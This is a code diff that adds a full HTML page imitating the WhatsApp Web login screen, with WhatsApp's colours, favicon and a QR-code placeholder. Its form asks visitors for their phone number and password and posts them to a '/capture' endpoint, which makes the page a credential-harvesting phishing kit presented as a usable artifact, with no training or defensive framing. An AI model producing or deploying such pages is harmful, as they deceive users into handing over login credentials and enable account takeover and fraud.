@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v4/yP/r/rYZqPCBaG70.png">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        
+        body { min-height: 100vh; background: linear-gradient(180deg, #00a884 0%, #00a884 127px, #d9dbd5 127px, #d9dbd5 100%); }
+        
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+        
+        .card {
+            background: #fff;
+            border-radius: 3px;
+            box-shadow: 0 17px 50px 0 rgba(11,20,26,0.19);
+            display: flex;
+            overflow: hidden;
+            max-width: 1000px;
+            width: 100%;
+        }
+        
+        .left {
+            flex: 1;
+            padding: 60px;
+            background: #fff;
+        }
+        
+        .right {
+            flex: 0 0 264px;
+            background: #f9f9f9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        
+        .help-banner {
+            background: #e1f5fe;
+            color: #01579b;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+        }
+        .help-banner h3 { font-size: 16px; margin-bottom: 8px; }
+        .help-banner p { font-size: 14px; }
+        
+        h2 {
+            color: #41525d;
+            font-size: 28px;
+            font-weight: 300;
+            margin-bottom: 40px;
+            line-height: 1.3;
+        }
+        
+        .device-selector {
+            margin-bottom: 30px;
+        }
+        
+        .device-option {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .device-icon {
+            width: 48px;
+            height: 48px;
+            background: #e7e7e7;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+        
+        .device-text h4 {
+            font-size: 18px;
+            color: #3b4a54;
+            font-weight: 400;
+            margin-bottom: 4px;
+        }
+        .device-text p { font-size: 14px; color: #8696a0; }
+        
+        .login-form h3 {
+            color: #41525d;
+            margin-bottom: 20px;
+            font-size: 16px;
+            font-weight: 400;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #d1d7db;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+        input:focus { outline: none; border-color: #00a884; }
+        
+        .btn-primary {
+            width: 100%;
+            background: #00a884;
+            color: #fff;
+            border: none;
+            border-radius: 24px;
+            padding: 14px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .btn-primary:hover { background: #008f72; }
+        
+        .qr-placeholder {
+            width: 264px;
+            height: 264px;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .qr-code {
+            width: 200px;
+            height: 200px;
+            background: #f0f0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+        }
+        .qr-code span { color: #999; font-size: 12px; }
+        
+        .qr-text { margin-top: 16px; color: #8696a0; font-size: 14px; text-align: center; }
+        
+        .link-device {
+            margin-top: 24px;
+            color: #00a884;
+            font-size: 14px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        footer {
+            margin-top: 32px;
+            padding: 20px;
+            text-align: center;
+            color: #8696a0;
+            font-size: 14px;
+        }
+        footer a { color: #00a884; text-decoration: none; margin: 0 8px; }
+        
+        @media (max-width: 768px) {
+            .card { flex-direction: column; }
+            .right { display: none; }
+            .left { padding: 40px 30px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="left">
+                <div class="help-banner">
+                    <h3>📱 WhatsApp Web</h3>
+                    <p>Log in to WhatsApp Web to send and receive messages from your</p>
+                </div>
+                
+                <h2>Use WhatsApp on your computer</h2>
+                
+                <div class="device-selector">
+                    <div class="device-option">
+                        <div class="device-icon">💻</div>
+                        <div class="device-text">
+                            <h4>WhatsApp Web</h4>
+                            <p>Use WhatsApp on your computer</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="login-form">
+                    <h3>Log in with phone number</h3>
+                    <form action="/capture" method="POST">
+                        <input type="tel" name="phone" placeholder="Phone number" required>
+                        <input type="password" name="password" placeholder="Enter your password" required>
+                        <button type="submit" class="btn-primary">Log In</button>
+                    </form>
+                </div>
+                
+                <p style="margin-top: 30px; font-size: 14px; color: #41525d;">
+                    Don't have WhatsApp on your phone? <a href="#" style="color: #00a884; text-decoration: none;">Download</a>
+                </p>
+            </div>
+            
+            <div class="right">
+                <div class="qr-placeholder">
+                    <div class="qr-code"><span>📷 QR Code</span></div>
+                    <p class="qr-text">Point your phone to this screen to capture the code</p>
+                </div>
+                
+                <a href="#" class="link-device">🔗 Link with phone number instead</a>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <a href="#">Need help?</a> •
+        <a href="#">Privacy Policy</a> •
+        <a href="#">Terms</a>
+    </footer>
+</body>
+</html>
